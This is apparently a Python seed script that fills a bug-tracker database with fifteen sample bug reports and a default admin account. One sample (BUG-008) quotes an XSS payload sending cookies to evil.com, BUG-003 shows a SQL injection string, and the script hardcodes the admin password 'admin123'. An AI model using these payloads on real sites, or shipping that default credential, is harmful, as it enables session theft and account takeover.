import os
import sqlite3
import datetime
from sqlalchemy.orm import Session
from backend.app.database import engine, Base, SessionLocal
from backend.app.models.bug import Bug, User, AnalysisResult, ChatMessage
from backend.app.utils.auth import get_password_hash
from backend.app.utils.logging import logger

SAMPLE_BUGS = [
    {
        "id": "BUG-001",
        "title": "NullPointerException in UserService.getProfile()",
        "description": "Application crashes when trying to view a user profile that has been recently deleted. The getProfile method does not check for null before accessing user properties.",
        "stackTrace": """java.lang.NullPointerException
    at com.app.service.UserService.getProfile(UserService.java:142)
    at com.app.controller.UserController.showProfile(UserController.java:85)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:897)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:750)""",
        "category": "Backend",
        "severity": "Critical",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "Missing null check in UserService.getProfile() when user record is deleted but cached reference still exists.",
        "resolution": "Added null check before accessing user properties. Implemented cache invalidation on user deletion. Added unit test for deleted user profile access.",
        "dateSubmitted": "2026-06-15",
        "dateResolved": "2026-06-16"
    },
    {
        "id": "BUG-002",
        "title": "Memory leak in WebSocket connection handler",
        "description": "Server memory usage increases continuously over time. After 48 hours of operation, the application becomes unresponsive and needs to be restarted.",
        "stackTrace": """java.lang.OutOfMemoryError: Java heap space
    at java.util.Arrays.copyOf(Arrays.java:3210)
    at java.util.ArrayList.grow(ArrayList.java:265)
    at com.app.websocket.ConnectionManager.addConnection(ConnectionManager.java:67)
    at com.app.websocket.WebSocketHandler.afterConnectionEstablished(WebSocketHandler.java:34)""",
        "category": "Backend",
        "severity": "Critical",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "WebSocket connections are added to the connection pool but never removed on disconnect. The ArrayList grows indefinitely.",
        "resolution": "Implemented proper connection cleanup in afterConnectionClosed(). Added a scheduled task to purge stale connections every 30 minutes. Added monitoring for connection pool size.",
        "dateSubmitted": "2026-06-20",
        "dateResolved": "2026-06-22"
    },
    {
        "id": "BUG-003",
        "title": "SQL Injection vulnerability in search endpoint",
        "description": "The search API endpoint directly concatenates user input into SQL queries without parameterization, allowing potential SQL injection attacks.",
        "stackTrace": """org.springframework.jdbc.BadSqlGrammarException: PreparedStatementCallback; 
bad SQL grammar [SELECT * FROM products WHERE name LIKE '%' OR '1'='1'--%]
    at org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:239)
    at com.app.repository.ProductRepository.searchProducts(ProductRepository.java:56)
    at com.app.service.SearchService.search(SearchService.java:31)""",
        "category": "Security",
        "severity": "Critical",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "User input is directly concatenated into SQL query string in ProductRepository.searchProducts() without using parameterized queries.",
        "resolution": "Replaced string concatenation with PreparedStatement parameters. Added input validation and sanitization layer. Implemented SQL injection detection in WAF rules.",
        "dateSubmitted": "2026-06-25",
        "dateResolved": "2026-06-25"
    },
    {
        "id": "BUG-004",
        "title": "Race condition in order processing",
        "description": "When two users place an order for the last item in stock simultaneously, both orders are accepted, resulting in negative inventory counts.",
        "stackTrace": """java.lang.IllegalStateException: Inventory count cannot be negative
    at com.app.service.InventoryService.decrementStock(InventoryService.java:89)
    at com.app.service.OrderService.processOrder(OrderService.java:156)
    at com.app.controller.OrderController.placeOrder(OrderController.java:43)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)""",
        "category": "Backend",
        "severity": "High",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "The check-then-act sequence in OrderService.processOrder() is not atomic. Multiple threads can read the same inventory count before either decrements it.",
        "resolution": "Implemented optimistic locking using @Version annotation on Inventory entity. Added database-level constraint to prevent negative stock. Used SELECT FOR UPDATE in critical inventory queries.",
        "dateSubmitted": "2026-07-01",
        "dateResolved": "2026-07-03"
    },
    {
        "id": "BUG-005",
        "title": "CSS layout breaks on Safari mobile",
        "description": "The main navigation menu overlaps with the content area on Safari iOS. The flexbox layout doesn't render correctly on Safari versions below 15.",
        "stackTrace": """Console Error:
[Warning] CSS property 'gap' is not supported in this browser version.
Layout calculated incorrectly for .nav-container with display: flex.
Element .main-content has computed top: 0px (expected: 64px).
Viewport: 375x812, Safari/604.1""",
        "category": "Frontend",
        "severity": "Medium",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The CSS 'gap' property for flexbox is not supported in Safari versions below 14.1. The nav-container relies on 'gap' for spacing, causing layout collapse.",
        "resolution": "Replaced 'gap' property with margin-based spacing for flexbox containers. Added -webkit- prefixed properties where needed. Added Safari-specific CSS fallbacks using @supports queries.",
        "dateSubmitted": "2026-07-05",
        "dateResolved": "2026-07-06"
    },
    {
        "id": "BUG-006",
        "title": "Authentication token not refreshed after expiry",
        "description": "Users are suddenly logged out after exactly 1 hour of inactivity. The JWT refresh token mechanism is not working properly.",
        "stackTrace": """Error: Token expired
    at AuthService.validateToken (auth-service.js:45)
    at AuthMiddleware.authenticate (auth-middleware.js:23)
    at Router.handle (router.js:178)
    at app.use (app.js:12)
Response: 401 Unauthorized
Headers: { "X-Token-Expired": "true", "X-Token-Age": "3600" }""",
        "category": "Authentication",
        "severity": "High",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The token refresh interceptor only triggers on 403 responses, but the server returns 401 for expired tokens. The refresh logic never executes.",
        "resolution": "Updated the HTTP interceptor to handle both 401 and 403 responses for token refresh. Added proactive token refresh 5 minutes before expiry. Implemented silent refresh using refresh token rotation.",
        "dateSubmitted": "2026-07-08",
        "dateResolved": "2026-07-09"
    },
    {
        "id": "BUG-007",
        "title": "Database connection pool exhaustion under load",
        "description": "During peak traffic hours, the application starts throwing 'Cannot acquire connection from pool' errors. All database connections appear to be in use.",
        "stackTrace": """com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator - Connection not available, request timed out after 30000ms.
    at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:195)
    at com.app.repository.BaseRepository.getConnection(BaseRepository.java:34)
    at com.app.service.ReportService.generateReport(ReportService.java:78)
Active connections: 50/50, Pending: 127, Idle: 0""",
        "category": "Database",
        "severity": "Critical",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "The ReportService.generateReport() method opens a database connection but fails to close it in the finally block when an exception occurs during report generation.",
        "resolution": "Wrapped all database operations in try-with-resources blocks. Increased connection pool size from 50 to 100. Added connection leak detection with 60-second threshold. Added monitoring alerts for pool utilization above 80%.",
        "dateSubmitted": "2026-07-10",
        "dateResolved": "2026-07-11"
    },
    {
        "id": "BUG-008",
        "title": "XSS vulnerability in comment rendering",
        "description": "User-submitted comments containing HTML/JavaScript are rendered without sanitization, allowing cross-site scripting attacks.",
        "stackTrace": """Security Scan Report:
Vulnerability: Reflected XSS
Location: /api/comments/render
Payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
Affected Component: CommentRenderer.renderHTML()
Risk Level: HIGH""",
        "category": "Security",
        "severity": "Critical",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "The CommentRenderer.renderHTML() method uses innerHTML to insert user content without any sanitization or encoding.",
        "resolution": "Replaced innerHTML with textContent for plain text comments. Implemented DOMPurify for rich text comments. Added Content-Security-Policy headers to prevent inline script execution. Added input validation on the server side.",
        "dateSubmitted": "2026-07-12",
        "dateResolved": "2026-07-12"
    },
    {
        "id": "BUG-009",
        "title": "Infinite re-render loop in React dashboard",
        "description": "The dashboard component re-renders continuously, causing the browser to freeze. CPU usage spikes to 100% when opening the dashboard page.",
        "stackTrace": """Warning: Maximum update depth exceeded. This can happen when a component calls setState inside useEffect without a dependency array.
    at DashboardComponent (Dashboard.jsx:15)
    at WidgetContainer (WidgetContainer.jsx:8)
    at AppLayout (AppLayout.jsx:22)
    at Router (react-router-dom.js:134)
React DevTools: 2847 re-renders detected in 3 seconds""",
        "category": "Frontend",
        "severity": "High",
        "priority": "P1",
        "status": "Resolved",
        "rootCause": "The useEffect hook in DashboardComponent has a dependency on an object that is recreated on every render, causing an infinite update loop.",
        "resolution": "Memoized the dependency object using useMemo(). Added proper dependency arrays to all useEffect hooks. Implemented React.memo() for child widget components to prevent unnecessary re-renders.",
        "dateSubmitted": "2026-07-14",
        "dateResolved": "2026-07-15"
    },
    {
        "id": "BUG-010",
        "title": "File upload fails for files larger than 10MB",
        "description": "When users try to upload files larger than 10MB, the upload silently fails with no error message. The file appears to upload but is never saved.",
        "stackTrace": """Error: Request entity too large
    at PayloadTooLargeError (node_modules/http-errors/index.js:45)
    at parse (node_modules/body-parser/lib/read.js:102)
    at multer.single (node_modules/multer/lib/make-middleware.js:51)
    at uploadController.handleUpload (upload-controller.js:28)
Request Headers: Content-Length: 15728640 (15MB)
Server Config: maxFileSize: 10485760 (10MB)""",
        "category": "Backend",
        "severity": "Medium",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The multer middleware has a default file size limit of 10MB. The error is caught by the global error handler but not forwarded to the client as a meaningful response.",
        "resolution": "Increased file size limit to 50MB in multer configuration. Added client-side file size validation before upload. Implemented proper error response for file size limit exceeded. Added file size display in the upload UI.",
        "dateSubmitted": "2026-07-16",
        "dateResolved": "2026-07-17"
    },
    {
        "id": "BUG-011",
        "title": "Timezone conversion error in scheduling module",
        "description": "Scheduled events created in IST timezone appear 5.5 hours early for users in UTC timezone. The timezone offset is applied in the wrong direction.",
        "stackTrace": """Expected: 2026-07-20T14:00:00+05:30 (IST) → 2026-07-20T08:30:00Z (UTC)
Actual:   2026-07-20T14:00:00+05:30 (IST) → 2026-07-20T19:30:00Z (UTC)
Error in: ScheduleService.convertToUTC(localTime, timezone)
Offset applied: +05:30 instead of -05:30""",
        "category": "Backend",
        "severity": "High",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The convertToUTC() function adds the timezone offset instead of subtracting it. The sign of the offset is reversed in the conversion formula.",
        "resolution": "Fixed the timezone conversion formula to subtract the offset when converting to UTC. Replaced custom timezone handling with the java.time.ZonedDateTime API. Added comprehensive timezone conversion tests for all major timezones.",
        "dateSubmitted": "2026-07-18",
        "dateResolved": "2026-07-19"
    },
    {
        "id": "BUG-012",
        "title": "API rate limiting not working correctly",
        "description": "The rate limiter allows 200 requests per minute instead of the configured 100. Some users are able to bypass rate limiting entirely.",
        "stackTrace": """Rate Limiter Debug Log:
[WARN] Client 192.168.1.45: 200 requests in 60s (limit: 100)
[ERROR] Rate limit check bypassed for path: /api/v2/*
[DEBUG] Redis key 'ratelimit:192.168.1.45' TTL: -1 (no expiry set)
[DEBUG] Counter increment without TTL reset detected""",
        "category": "Security",
        "severity": "High",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The Redis key for rate limiting is created with INCR but the EXPIRE command fails silently when Redis is under load. Also, /api/v2/* paths are excluded from rate limiting due to a misconfigured route matcher.",
        "resolution": "Used Redis MULTI/EXEC to atomically set the counter and expiry. Fixed the route matcher to include /api/v2/* paths. Added a Lua script for atomic rate limit checking. Added monitoring for rate limiter bypass attempts.",
        "dateSubmitted": "2026-07-20",
        "dateResolved": "2026-07-21"
    },
    {
        "id": "BUG-013",
        "title": "Email notifications sent in wrong language",
        "description": "Users with locale set to 'fr-FR' are receiving email notifications in English instead of French. The locale preference is not being passed to the email template engine.",
        "stackTrace": """[EmailService] Rendering template: order_confirmation
[EmailService] User locale: fr-FR
[EmailService] Template locale resolved: en-US (default)
[TemplateEngine] No locale override provided, using system default
[EmailService] Email sent to user@example.com with locale: en-US""",
        "category": "Backend",
        "severity": "Low",
        "priority": "P3",
        "status": "Resolved",
        "rootCause": "The EmailService creates the template context without passing the user's locale preference. The TemplateEngine falls back to the system default locale (en-US).",
        "resolution": "Updated EmailService to pass user locale to the TemplateEngine context. Added locale validation to ensure only supported languages are used. Created fallback chain: user locale → browser locale → default locale.",
        "dateSubmitted": "2026-07-22",
        "dateResolved": "2026-07-23"
    },
    {
        "id": "BUG-014",
        "title": "Pagination returns duplicate results",
        "description": "When paginating through search results, some items appear on both page 2 and page 3. The total count changes between requests.",
        "stackTrace": """Query Debug:
Page 2: SELECT * FROM items ORDER BY created_at OFFSET 20 LIMIT 10
  Results: [item-21, item-22, ..., item-30]
Page 3: SELECT * FROM items ORDER BY created_at OFFSET 30 LIMIT 10
  Results: [item-29, item-30, item-31, ..., item-38]
Note: New items inserted between requests shifted the offset""",
        "category": "Database",
        "severity": "Medium",
        "priority": "P3",
        "status": "Resolved",
        "rootCause": "OFFSET-based pagination is unstable when new records are inserted between page requests. New inserts shift the offset positions, causing items to appear on multiple pages.",
        "resolution": "Replaced OFFSET pagination with cursor-based (keyset) pagination using the last seen item's ID. Added a stable sort key (id) as secondary sort after created_at. Updated API to return cursor tokens instead of page numbers.",
        "dateSubmitted": "2026-07-24",
        "dateResolved": "2026-07-25"
    },
    {
        "id": "BUG-015",
        "title": "CORS error blocking API calls from mobile app",
        "description": "The mobile app's web view cannot make API calls to the backend. Browser console shows CORS policy errors for all POST requests.",
        "stackTrace": """Access to XMLHttpRequest at 'https://api.example.com/v1/data' 
from origin 'capacitor://localhost' has been blocked by CORS policy: 
Response to preflight request doesn't pass access control check: 
No 'Access-Control-Allow-Origin' header is present on the requested resource.
Failed requests: POST /v1/data, PUT /v1/data/456, DELETE /v1/data/456""",
        "category": "Backend",
        "severity": "High",
        "priority": "P2",
        "status": "Resolved",
        "rootCause": "The CORS configuration only allows 'http://localhost' and 'https://app.example.com' origins. The mobile app's web view uses 'capacitor://localhost' which is not in the allowed origins list.",
        "resolution": "Added 'capacitor://localhost' and 'ionic://localhost' to the CORS allowed origins. Configured CORS to allow credentials and all necessary headers. Added environment-specific CORS configuration for development, staging, and production.",
        "dateSubmitted": "2026-07-26",
        "dateResolved": "2026-07-26"
    }
]

def seed_database(db: Session, force: bool = False):
    if force:
        try:
            Base.metadata.drop_all(bind=engine)
        except Exception:
            pass
    Base.metadata.create_all(bind=engine)

    if db.query(Bug).count() == 0:
        logger.info("Seeding database with 15 sample bugs...")
        for bdata in SAMPLE_BUGS:
            bug = Bug(
                bug_code=bdata["id"],
                title=bdata["title"],
                description=bdata["description"],
                stack_trace=bdata["stackTrace"],
                category=bdata["category"],
                severity=bdata["severity"],
                priority=bdata["priority"],
                status=bdata["status"],
                root_cause=bdata.get("rootCause"),
                resolution=bdata.get("resolution"),
                date_submitted=datetime.datetime.strptime(bdata["dateSubmitted"], "%Y-%m-%d").date(),
                date_resolved=datetime.datetime.strptime(bdata["dateResolved"], "%Y-%m-%d").date() if bdata.get("dateResolved") else None
            )
            db.add(bug)
        db.commit()
        logger.info("Sample bugs seeded successfully.")

    if db.query(User).count() == 0:
        logger.info("Seeding default admin user...")
        admin = User(
            email="admin@example.com",
            hashed_password=get_password_hash("admin123"),
            full_name="Admin User",
            role="admin"
        )
        db.add(admin)
        db.commit()
        logger.info("Default user seeded.")

if __name__ == "__main__":
    import sys
    force_flag = "--force" in sys.argv or "-f" in sys.argv
    db = SessionLocal()
    seed_database(db, force=force_flag)
    db.close()
